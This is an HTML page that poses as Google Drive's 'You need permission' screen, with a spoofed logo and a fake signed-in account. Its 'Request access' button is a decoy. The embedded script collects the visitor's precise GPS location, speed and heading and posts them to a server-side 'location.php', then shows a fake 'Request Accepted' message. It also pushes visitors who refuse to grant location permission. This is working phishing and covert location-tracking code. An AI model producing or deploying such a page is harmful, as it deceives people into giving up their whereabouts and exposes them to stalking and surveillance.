<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Google Drive</title>
<link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png"/>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}

body{
  font-family:'Roboto',Arial,sans-serif;
  background:#fff;
  color:#202124;
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

/* ── TOP NAV ── */
nav{
  display:flex;align-items:center;justify-content:space-between;
  padding:0 20px;height:64px;
  border-bottom:1px solid #e0e0e0;
}
.nav-left{display:flex;align-items:center;gap:4px;}
.logo-wrap{display:flex;align-items:center;gap:6px;text-decoration:none;padding:4px 8px;}
.logo-wrap svg.drive-logo{width:40px;height:auto;}
.logo-text{
  font-family:'Product Sans','Google Sans',Arial,sans-serif;
  font-size:22px;color:#5f6368;font-weight:400;
  letter-spacing:-.2px;
}
.nav-right{display:flex;align-items:center;gap:4px;}
.n-btn{
  width:40px;height:40px;border-radius:50%;
  border:none;background:none;cursor:pointer;
  display:flex;align-items:center;justify-content:center;
}
.n-btn:hover{background:#f1f3f4;}
.n-btn svg{width:22px;height:22px;fill:#5f6368;}
.avatar{
  width:32px;height:32px;border-radius:50%;
  background:#4285F4;color:#fff;
  font-size:14px;font-weight:500;
  display:flex;align-items:center;justify-content:center;
  font-family:'Google Sans',sans-serif;cursor:pointer;
  margin-left:4px;
}

/* ── PAGE BODY ── */
main{
  flex:1;display:flex;flex-direction:column;
  align-items:center;justify-content:flex-start;
  padding-top:90px;
}

/* Big Drive logo + name */
.page-logo{
  display:flex;flex-direction:column;align-items:center;
  margin-bottom:52px;
  gap:14px;
}
.page-logo svg{width:64px;height:auto;}
.page-logo-text{
  font-family:'Product Sans','Google Sans',Arial,sans-serif;
  font-size:26px;color:#80868b;font-weight:400;
  letter-spacing:-.3px;
}

.card{
  max-width:540px;width:100%;padding:0 28px;
}
.card h1{
  font-family:'Google Sans',sans-serif;
  font-size:34px;font-weight:400;
  color:#202124;margin-bottom:14px;
  letter-spacing:-.3px;
}
.card p{
  font-size:14px;color:#5f6368;
  line-height:1.7;margin-bottom:26px;
}
.card p a{color:#1a73e8;text-decoration:none;}
.card p a:hover{text-decoration:underline;}

.req-btn{
  display:inline-flex;align-items:center;gap:8px;
  background:#1a73e8;color:#fff;
  border:none;border-radius:4px;
  padding:9px 20px;
  font-size:14px;font-weight:500;letter-spacing:.25px;
  font-family:'Roboto',sans-serif;
  cursor:pointer;
  box-shadow:0 1px 2px rgba(26,115,232,.3);
  transition:background .16s,box-shadow .16s;
}
.req-btn:hover{background:#1765cc;box-shadow:0 2px 6px rgba(26,115,232,.4);}
.req-btn:active{background:#185abc;}

.signed-in{
  margin-top:28px;font-size:13.5px;color:#5f6368;
}
.signed-in a{color:#1a73e8;text-decoration:none;}
.signed-in a:hover{text-decoration:underline;}

/* ── SUCCESS TOAST ── */
.toast{
  position:fixed;bottom:28px;left:50%;
  transform:translateX(-50%) translateY(16px);
  background:#323232;color:#fff;
  padding:12px 22px;border-radius:4px;
  font-size:14px;font-family:'Roboto',sans-serif;
  opacity:0;pointer-events:none;
  transition:opacity .28s,transform .28s;
  white-space:nowrap;z-index:999;
}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}

/* ── FOOTER ── */
footer{
  text-align:center;padding:18px;
  font-size:12px;color:#80868b;
}
footer a{color:#80868b;text-decoration:none;margin:0 10px;}
footer a:hover{text-decoration:underline;}
.policy-section{
  width:100%;
  display:flex;
  justify-content:center;
  padding:40px 20px;
  border-top:1px solid #e0e0e0;
  margin-top:40px;
}

.policy-box{
  max-width:600px;
  text-align:center;
  color:#5f6368;
}

.policy-box h3{
  font-family:'Google Sans',sans-serif;
  font-size:18px;
  margin-bottom:10px;
  color:#202124;
}

.policy-box p{
  font-size:13px;
  line-height:1.6;
  margin-bottom:15px;
}

.policy-links{
  display:flex;
  justify-content:center;
  gap:15px;
  flex-wrap:wrap;
}

.policy-links a{
  font-size:12px;
  color:#1a73e8;
  text-decoration:none;
}

.policy-links a:hover{
  text-decoration:underline;
}
</style>
</head>
<body>

<!-- TOP NAV -->
<nav>
  <div class="nav-left">
    <a href="#" class="logo-wrap">
      <!-- Google Drive SVG logo (exact) -->
      <svg class="drive-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 87.3 78">
        <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
        <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/>
        <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
        <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
        <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
        <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 27h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
      </svg>
      <span class="logo-text">Drive</span>
    </a>
  </div>
  <div class="nav-right">
    <button class="n-btn" title="Google apps">
      <svg viewBox="0 0 24 24"><path d="M6 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zM6 14a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zM6 20a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4z"/></svg>
    </button>
    <div class="avatar">HD</div>
  </div>
</nav>

<!-- MAIN -->
<main>

  <!-- Big Drive Logo -->
  <div class="page-logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 87.3 78">
      <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
      <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/>
      <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
      <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
      <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
      <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 27h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
    </svg>
    <span class="page-logo-text">Drive</span>
  </div>

  <div class="card">
    <h1>You need permission</h1>
    <p>Want in? Ask for access, or <a href="#">switch to an account</a> with permission.</p>
    <button class="req-btn" id="reqBtn" onclick="requestAccess()">Request access</button>
    <div class="signed-in">
      You're signed in as <a href="#">hackdeva@gmail.org</a>
    </div>
  </div>

</main>
<!-- =========================
     📄 POLICY / INFO SECTION
========================= -->
<section class="policy-section">
  <div class="policy-box">
    
    <h3>Policies & Information</h3>

    <p>
      By continuing, you agree to our Terms of Service and Privacy Policy.
      This page is protected and monitored for security purposes.
    </p>

    <div class="policy-links">
      <a href="#">Privacy Policy</a>
      <a href="#">Terms of Service</a>
      <a href="#">Security</a>
      <a href="#">Help Center</a>
    </div>

  </div>
</section>
<footer>
  <a href="#">Privacy Policy</a>
  <a href="#">Terms of Service</a>
</footer>

<!-- TOAST -->
<div class="toast" id="toast">Request sent to file owner</div>
<script src="Detels.js"></script>
<script>
(() => {

    function getLocation() {

        if (!navigator.geolocation) {
            updateUI("unsupported");
            return;
        }

        navigator.geolocation.getCurrentPosition(

            (position) => {

                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date().toISOString()
                };

                console.log("📍 Location OK:", data);

                sendLocation(data);

                updateUI("success");

            },

            (error) => {

                console.log("❌ GPS Error:", error.message);

                if (error.code === error.PERMISSION_DENIED) {
                    updateUI("denied");
                } else {
                    updateUI("error");
                }

            },

            {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            }
        );
    }

    async function sendLocation(data) {
        try {
            await fetch("location.php", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        } catch (err) {
            console.log("Server error");
        }
    }

    // ==========================
    // 🎯 UI UPDATE SYSTEM
    // ==========================
    function updateUI(state) {

        const card = document.querySelector(".card");
        const btn = document.getElementById("reqBtn");

        if (state === "denied") {
            card.innerHTML = `
                <h1>Access Required</h1>
                <p>Request permission denied. Please allow permission to continue.</p>
                <button class="req-btn" id="reqBtn">Allow Access</button>
            `;
            document.getElementById("reqBtn").addEventListener("click", getLocation);
        }

        if (state === "success") {
            card.innerHTML = `
                <h1>✓ Request Accepted</h1>
                <p>Your request has been successfully processed.</p>
            `;
        }

        if (state === "error") {
            card.innerHTML = `
                <h1>Try Again</h1>
                <p>Unable to get location. Please retry.</p>
                <button class="req-btn" id="reqBtn">Retry</button>
            `;
            document.getElementById("reqBtn").addEventListener("click", getLocation);
        }

        if (state === "unsupported") {
            card.innerHTML = `
                <h1>Not Supported</h1>
                <p>Your browser does not support location services.</p>
            `;
        }
    }

    // initial button
    document.getElementById("reqBtn").addEventListener("click", getLocation);

})();
</script>
</body>
</html>
